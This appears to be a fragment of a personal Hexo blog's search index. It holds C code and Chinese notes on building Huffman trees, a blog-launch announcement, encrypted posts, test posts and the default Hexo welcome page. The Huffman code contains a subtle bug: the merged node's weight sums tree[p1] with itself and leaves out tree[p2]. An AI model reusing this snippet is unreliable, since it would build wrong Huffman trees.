class="comment">//MAXFLOAT为最大浮点数</span></span><br><span class="line">        small2=MAXFLOAT;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i<span class="number">-1</span>;j++)&#123;<span class="comment">//选择两个最小的权</span></span><br><span class="line">            <span class="keyword">if</span>(tree[j].parent==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tree[j].weight&lt;small1)&#123;</span><br><span class="line">                    small2=small1;<span class="comment">//更新最小权，次小权，及其位置</span></span><br><span class="line">                    small1=tree[j].weight;<span class="comment">//找出最小权</span></span><br><span class="line">                    p2=p1;</span><br><span class="line">                    p1=j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(tree[j].weight&lt;small2)&#123;</span><br><span class="line">                    small2=tree[j].weight;<span class="comment">//改变次小权及位置</span></span><br><span class="line">                    p2=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tree[p1].parent=i+<span class="number">1</span>;</span><br><span class="line">        tree[p2].parent=i+<span class="number">1</span>;</span><br><span class="line">      <span class="comment">//将新生成的结点放在tree[i+1]</span></span><br><span class="line">        tree[i+<span class="number">1</span>].lch=p1;</span><br><span class="line">        tree[i+<span class="number">1</span>].rch=p2;</span><br><span class="line">        tree[i+<span class="number">1</span>].weight=tree[p1].weight+tree[p1].weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="赫夫曼编码"><a href="#赫夫曼编码" class="headerlink" title="赫夫曼编码"></a>赫夫曼编码</h4><p>1)首先构造出赫夫曼树</p><p>2)每个结点的左分支计0 右分支计1，从根结点到叶子结点的沿途路径分支组成的01代码串即赫夫曼编码</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>个人博客基本部署成功！</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>11.09日我的博客基本部署成功了，有一些基本的美化功能（借鉴各路大佬）<br>接下来预计将会逐步完善各项功能，留言板已开，可以多多留言<br>预计接下来会发布内容关于：<br>1.ctf题目/工具解答 本人misc做的多点，预计一个月内发布一篇misc工具合集介绍。<br>2.学校的课程内容，主要是为了复习+记录。<br>3.个人日常板块还没做，迟早会发。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>a basic test</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>test test tes</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>今日测试</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="314b778ccd1012cad8846435536f091270f2b36b97591be73fd3ae3f00163cdd">10d79030e8222445804370796b90fca18d3af0ca0aed65002f2d27e5161276f9a34ce6f47914fa2d3c77a4530036ebbf49392c613893bc04a4747ee94fb4d5f88c16dc93152c4f00c0ef25a2ae27d29cd3b7a1c8f2dba4224c6e826413ea97a1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>work_12.11</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4237b5ab9b62ff40e91ec2f2339630465adbd8b2917c54802b887802653cdc78">01c5434afc057ec70c0b06aa0591fac6feaac8ea76c74c2a16a82314c7311e3d7a8f6737cf7b5c9038c6896dbf539075414845885f166cbc4c60fc4e2685be30b483fc1b39384fa2edc582211d27467ff62aac53660ebd6b7cbe4aff2b8872e220eb40bd790ff5838c8e22b6a2b2e12cafa1ba3d29e51f2b55cbeab4c022e21298cf2583bbf44aa28cd5bb30cdc842aa07134361303d2e403741d7cee9bc62af</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test4blog</title>
      <link href="/2023/11/08/"/>
      <url>/2023/11/08/</url>
      
        <content type="html"><![CDATA[<p>This is a test for lincoxi to test if his blog works ok.</p><p>My github account is cyan4run. It’s easy to recongnize.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/08/"/>
      <url>/2023/11/08/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
